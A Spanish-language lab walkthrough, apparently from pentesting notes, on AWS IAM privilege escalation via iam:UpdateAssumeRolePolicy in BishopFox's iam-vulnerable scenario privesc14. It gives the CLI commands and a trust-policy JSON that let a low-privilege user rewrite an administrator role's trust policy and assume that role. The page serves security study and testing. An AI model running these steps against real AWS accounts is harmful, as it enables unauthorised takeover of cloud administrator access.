# AssumeRolePolicy Update

Una **AssumeRolePolicy** (también denominada política de confianza), define qué entidades pueden asumir un rol. El permiso para actualizar una **AssumeRolePolicy** cae técnicamente en la categoría de escalada de privilegios "Permisos sobre políticas". Sin embargo, AssumeRolePolicy merece una categoría aparte debido a su importancia en los entornos de AWS, además del hecho de que a menudo se malinterpreta.

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption><p>MiPoliticaEC2</p></figcaption></figure>

La política llamada _MiPoliticaEC2_, especifica que el rol solamente puede ser asumida por el servicio EC2, como se indica en el objeto del JSON: “service”: “ec2.amazonaws.com”.

Cuando otra entidad del entorno (como un usuario u otro servicio) que intente asumir este rol AWS denegará la solicitud. Esta es una protección importante contra los intentos de escalar privilegios asumiendo un rol de privilegios elevados.

El permiso **iam:UpdateAssumeRolePolicy** proporciona a una entidad la capacidad de cambiar la **AssumeRolePolicy** de un rol. Por lo tanto, si un usuario no está incluido en esta política, pero tiene la capacidad de actualizarla, simplemente puede agregar su cuenta de usuario **AssumeRolePolicy**, y en consecuencia, asumir el rol. Según los permisos asociados con el rol, esto podría proporcionar una ruta para la escalada de privilegios.

## Laboratorio

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}
Lab: IAM - Vulnerable | Escenario: privesc14
{% endembed %}

Usuario del laboratorio:privesc14-UpdatingAssumeRolePolicy-user con el rol:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Configuración inicial

Listar las políticas asociadas al usuario:

{% code overflow="wrap" %}
```
aws iam list-attached-user-policies --user-name privesc14-UpdatingAssumeR olePolicy-user
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Después, usando el ARN del nombre de la política se puede listar los permisos:

{% code overflow="wrap" %}
```
aws iam get-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc14-UpdatingAssumeRolePolicy --version-id v1
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Ahora se tiene que generar llaves de acceso para trabajar con el usuario:

{% code overflow="wrap" %}
```
aws sts assume-role --role-arn arn:aws:iam::651927172911:role/privesc14- UpdatingAssumeRolePolicy-role --role-session-name privesc14
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Y configurar el acceso con AWS configure:

```bash
aws configure --profile privesc14
```

<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

Y validar las llaves:

```bash
aws sts get-caller-identity --profile privesc14
```

<figure><img src="../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

### Explotación

En este escenario, se tiene que crear un documento de política que contenga el permiso **sts:AssumeRole** sobre el ARN del usuario atacante

{% code title="assumerolepolicy.json" overflow="wrap" %}
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:sts::651927172911:assumed-role/privesc14-UpdatingAssumeRolePolicy-role/privesc14"
            },
            "Action": "sts:AssumeRole",
            "Condition": {}
        }
    ]
}

```
{% endcode %}

{% hint style="info" %}
El ARN del usuario que se encuentra en nuestra política maliciosa es el valor resultante del comando aws sts get-caller-identity
{% endhint %}

A continuación, se tiene que modificar la política para un rol administrativo con el permiso **update-assume-role-policy** , con el objetivo de que el usuario privesc14 pueda asumir dicho rol:

{% code overflow="wrap" %}
```
aws iam update-assume-role-policy --role-name Rol-Administrator --policy-document file://assumerolepolicy.json --profile privesc14
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Listando el rol que se acaba de de actualizar se puede observar que tiene capacidades de administrador

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Dado que el rol apunta ahora a nuestro usuario y el usuario tiene capacidades de asumir roles, procedemos a asumir el rol actualizado malicioso:

{% code overflow="wrap" %}
```
aws sts assume-role --role-arn arn:aws:iam::651927172911:role/Rol-Administrator-Spartan --role-session-name privesc14admin --profile privesc14
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Con las nuevas credenciales se proceden a configurar en aws configure con un nuevo perfil

```
aws configure --profile privesc14admin
```

<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Y dado que este rol ahora tiene permisos de administrador, podemos decir que se a comprometido exitosamente.





